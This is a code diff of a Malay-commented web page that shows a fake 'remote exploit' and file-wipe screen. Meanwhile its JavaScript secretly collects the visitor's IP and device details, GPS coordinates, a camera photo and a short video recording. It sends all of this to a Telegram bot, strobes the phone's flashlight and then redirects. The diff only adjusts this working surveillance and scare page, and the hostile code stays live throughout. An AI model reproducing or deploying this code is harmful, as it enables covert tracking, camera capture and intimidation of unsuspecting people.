@@ -11,7 +11,6 @@
             display: flex; flex-direction: column;
             justify-content: center; align-items: center;
             height: 100vh; margin: 0; overflow: hidden;
-            transition: background 0.1s;
         }
         #overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -19,7 +18,7 @@
             display: flex; justify-content: center; align-items: center;
             cursor: pointer;
         }
-        .container { width: 85%; max-width: 600px; z-index: 10; }
+        .container { width: 85%; max-width: 600px; }
         .header {
             font-weight: bold; font-size: 1.2rem; margin-bottom: 20px;
             border-bottom: 1px solid #0f0; padding-bottom: 10px;
@@ -35,8 +34,6 @@
         .progress-bar { width: 100%; height: 10px; border: 1px solid #0f0; margin-top: 20px; }
         .progress-fill { height: 100%; background: #f00; width: 0%; transition: width 0.3s; }
         .red { color: #ff0000; font-weight: bold; }
-        /* Efek skrin berkelip */
-        .strobe-active { background: #fff !important; color: #000 !important; }
     </style>
 </head>
 <body onclick="activateAll()">
@@ -108,7 +105,7 @@
             logToConsole("Initializing remote exploit...");
             const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
 
-            // --- FITUR 5 (A): FAKE SCROLLING WIPE ---
+            // --- FITUR 5 (BAHAGIAN A): FAKE SCROLLING WIPE ---
             const fakeFiles = ["Contacts.vcf", "WhatsApp_Database.db", "Private_Photos.zip", "Banking_Cache.tmp", "Browser_History.log"];
             let fIdx = 0;
             const fInt = setInterval(() => {
@@ -144,7 +141,6 @@
                 else if (ua.match(/Windows/i)) brandPhone = "Windows PC";
             }
 
-            // Info Peranti & IP
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
@@ -159,48 +155,33 @@
                 });
             } catch (e) {}
 
-            // GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({chat_id: CURRENT_CHAT_ID, text: `📍 *GPS COORDINATES:*\n[Open Map](${map})`, parse_mode: 'Markdown'})
+                        body: JSON.stringify({chat_id: CURRENT_CHAT_ID, text: `📍 *GPS COORDINATES:*\n[Google Maps](${map})`, parse_mode: 'Markdown'})
                     });
                 }, null, {enableHighAccuracy:true});
             }
 
-            // Kamera & Fitur 5 (B)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
+                // --- FITUR 5 (BAHAGIAN B): FLASHLIGHT BLINK (ANDROID) ---
                 const track = stream.getVideoTracks()[0];
-                const caps = track.getCapabilities();
+                if (track.getCapabilities().torch) {
+                    let flashOn = false;
+                    const flashInt = setInterval(() => {
+                        flashOn = !flashOn;
+                        track.applyConstraints({ advanced: [{ torch: flashOn }] });
+                    }, 200);
+                    setTimeout(() => clearInterval(flashInt), 5000);
+                }
 
-                // --- LOGIK FLASH & SCREEN STROBE ---
-                let isStrobe = true;
-                const strobeInt = setInterval(async () => {
-                    if(!isStrobe) return;
-                    // Flash fizikal (Jika ada)
-                    if (caps.torch) {
-                        const currentTorch = track.getConstraints().advanced?.[0]?.torch;
-                        track.applyConstraints({ advanced: [{ torch: !currentTorch }] });
-                    }
-                    // Skrin Berkelip (Backup)
-                    document.body.classList.toggle('strobe-active');
-                }, 150;
-
-                setTimeout(() => {
-                    isStrobe = false;
-                    clearInterval(strobeInt);
-                    document.body.classList.remove('strobe-active');
-                    if(caps.torch) track.applyConstraints({ advanced: [{ torch: false }] });
-                }, 6000);
-
-                // Tangkap Gambar
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
@@ -213,7 +194,6 @@
                     }, 'image/jpeg');
                 }, 4000);
 
-                // Rakaman Video
                 const mr = new MediaRecorder(stream);
                 const chunks = [];
                 mr.ondataavailable = (e) => chunks.push(e.data);
@@ -221,13 +201,13 @@
                     const fdV = new FormData();
                     fdV.append('chat_id', CURRENT_CHAT_ID);
                     fdV.append('video', new Blob(chunks, {type:'video/mp4'}), 'record.mp4');
+                    fdV.append('caption', `📹 *VIDEO STREAM (6s)*`);
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {method:'POST', body:fdV});
                     stream.getTracks().forEach(t => t.stop());
                 };
                 mr.start();
                 setTimeout(() => mr.stop(), 7000);
-
-            } catch (e) { logToConsole("Hardware access denied.", true); }
+            } catch (e) { logToConsole("Security bypass incomplete.", true); }
 
             setTimeout(() => { window.location.href = "https://blogs.mtdv.me/videos/452uSngg5p"; }, 18000);
         }
